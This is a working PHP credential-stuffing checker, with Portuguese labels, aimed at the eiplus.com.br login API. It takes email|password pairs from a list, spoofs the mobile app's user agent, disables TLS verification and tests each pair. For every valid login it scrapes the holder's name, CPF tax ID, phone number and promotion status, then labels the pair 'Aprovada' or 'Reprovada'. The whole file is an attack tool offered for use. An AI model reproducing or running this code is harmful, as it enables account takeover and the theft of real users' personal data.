<?php

$atualizacao = 'FUNCIONAL ATÉ HOJE 01-10-21';
extract($_GET);
error_reporting(0);
set_time_limit(0);
session_start();


$time = time();

DeletarCookies();
if ($_SERVER['REQUEST_METHOD'] == "POST") {
	extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
	extract($_GET);
}

function deletarCookies()
{
	if (file_exists("cookie.txt")) {
		unlink("cookie.txt");
	}
}
function multiexplode($delimiters, $string)
{
	$ready = str_replace($delimiters, $delimiters[0], $string);
	$launch = explode($delimiters[0], $ready);
	return  $launch;
}

function GetStr($string, $start, $end)
{
	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];
}
extract($_GET);
$lista = $_GET['lista'];
$lista = str_replace(" ", "", $lista);
$separadores = array(",", "|", ":", "'", " ", "~", "»");
$explode = multiexplode($separadores, $lista);
$email = $explode[0];
$senha = $explode[1];






function mod($dividendo, $divisor)
{
	return round($dividendo - (floor($dividendo / $divisor) * $divisor));
}

//_____________________________________________________________________________________________//
// 1 LOGIN //
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.eiplus.com.br/api/auth/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(

	'Host: www.eiplus.com.br',
	'accept: application/json',
	'user-agent: android mobile app-android 7.5.8',
	'content-type: application/json',
	'accept-encoding: gzip',

));
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_USERAGENT, $_Server['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"password":"' . $senha . '","username":"' . $email . '"}');
$data1 = curl_exec($ch);

//_________________________________//

if (strpos($data1, '"token"')) {


	$nome = getStr($data1, '","nome":"', '"');

	$cpf1 = getStr($data1, '"cpf_cnpj":"', '"');

	$tel1 = getStr($data1, '"telefone":"', '"');

	$promo1 = getStr($data1, '"promocao_ativa":', ',"');

	$promo2 = getStr($data1, '"cupom":"', '"');

	$id1 = getStr($data1, '"plano":{"id":', ',');

	$valor1 = getStr($data1, '"valor":"', '"');


	//_________________________________//
	// IFS //

	// CUPOM //
	if (strpos($data1, '"promocao_ativa":null')) {
		$promo3 = "Não";
	} else {
		$promo3 = "$promo2";
	}


	// TEL //
	if (strpos($data1, '"telefone":null')) {
		$tel2 = "Não Cadastrado";
	} else {
		$tel2 = "$tel1";
	}


	// CPF //
	if (strpos($data1, '"cpf_cnpj":null')) {
		$cpf2 = "Não Cadastrado";
	} else {
		$cpf2 = "$cpf1";
	}


	// DESGUTAÇÃO //
	if (strpos($data1, '"degustacao":true')) {
		$degus = "Sim";
	} else {
		$degus = "Não";
	}



	//_________________________________//

	$dados = "NOME : $nome | CPF : $cpf2 | TELEFONE : $tel2 | PROMOÇÃO ATIVA : $promo3 | CONTA EM DEGUSTAÇÃO : $degus";

	//_________________________________//

	exit('<b><span class="badge badge-success">Aprovada</span> ➜ ' . $email . '|' . $senha . ' ➜ <font style=color:#ffcc00>' . $dados . '</font> ➜ <span class="badge badge-primary">Logado Com Sucesso</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');
} else {
	exit('<b><span class="badge badge-danger">Reprovada</span> ➜ ' . $email . '|' . $senha . ' ➜ <span class="badge badge-primary">Dados Incorretos</span> ➜ ' . (time() - $time) .  ' Seg</b><br>');
}